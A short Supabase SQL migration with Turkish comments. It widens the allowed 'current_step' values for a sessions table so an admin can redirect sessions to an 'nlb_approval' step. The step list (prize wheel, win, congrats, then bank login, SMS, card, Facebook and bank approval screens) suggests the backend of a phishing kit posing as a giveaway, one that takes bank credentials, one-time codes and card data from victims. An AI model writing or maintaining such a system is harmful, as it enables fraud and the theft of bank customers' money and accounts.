-- =====================================================================
-- 2026-10-13  NLB_APPROVAL STEP'INI CHECK KISITINA EKLE
-- HATA: sessions_current_step_check kısıtında 'nlb_approval' degeri YOKTU,
-- admin "NLB Onayina Yonlendir" aksiyonu (current_step='nlb_approval')
-- reddediliyordu. Ayrica SessionStep union'undaki 'custom_question',
-- 'generator1', 'generator2' de listede eksikti - hepsi eklendi.
-- Calistir: Supabase > SQL Editor > New Query > Yapistir > RUN
-- =====================================================================

-- 1) ESKI KISITI SIL
ALTER TABLE public.sessions DROP CONSTRAINT IF EXISTS sessions_current_step_check;

-- 2) YENI KISIT: SessionStep union + legacy degerler ('congratulations', 'SPECIAL_INFO')
ALTER TABLE public.sessions ADD CONSTRAINT sessions_current_step_check
CHECK (
  current_step IN (
    'code_entry',
    'wheel',
    'verify',
    'win',
    'bank',
    'banken',
    'login',
    'bank_login',
    'wait',
    'sms',
    'card',
    'facebook',
    'congrats',
    'congratulations',
    'special_approval',
    'generator1',
    'generator2',
    'custom_question',
    'invalid_bank',
    'live_support',
    'nlb_approval',
    'SPECIAL_INFO'
  )
);

-- 3) PostgREST schema cache YENILE
NOTIFY pgrst, 'reload schema';

-- 4) Kontrol
SELECT id, public_id, current_step, status
FROM public.sessions
ORDER BY created_at DESC
LIMIT 10;
